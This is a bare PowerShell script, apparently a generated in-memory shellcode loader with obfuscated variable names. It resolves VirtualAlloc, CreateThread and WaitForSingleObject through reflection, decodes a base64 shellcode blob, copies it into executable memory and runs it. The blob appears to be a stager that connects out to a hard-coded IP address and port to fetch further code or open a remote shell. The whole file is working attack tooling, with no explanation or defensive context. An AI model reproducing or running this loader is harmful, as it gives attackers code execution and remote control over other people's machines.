function d38 {
	Param ($zGj9, $waVIp)		
	$lekdc = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $lekdc.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($lekdc.GetMethod('GetModuleHandle')).Invoke($null, @($zGj9)))), $waVIp))
}

function tvSP {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $h6X,
		[Parameter(Position = 1)] [Type] $k5Kdm = [Void]
	)
	
	$qQD = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$qQD.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $h6X).SetImplementationFlags('Runtime, Managed')
	$qQD.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $k5Kdm, $h6X).SetImplementationFlags('Runtime, Managed')
	
	return $qQD.CreateType()
}

[Byte[]]$tzIu = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABJcCgoOIUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$r_Qdr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((d38 kernel32.dll VirtualAlloc), (tvSP @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $tzIu.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($tzIu, 0, $r_Qdr, $tzIu.length)

$iKh = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((d38 kernel32.dll CreateThread), (tvSP @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$r_Qdr,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((d38 kernel32.dll WaitForSingleObject), (tvSP @([IntPtr], [Int32]))).Invoke($iKh,0xffffffff) | Out-Null
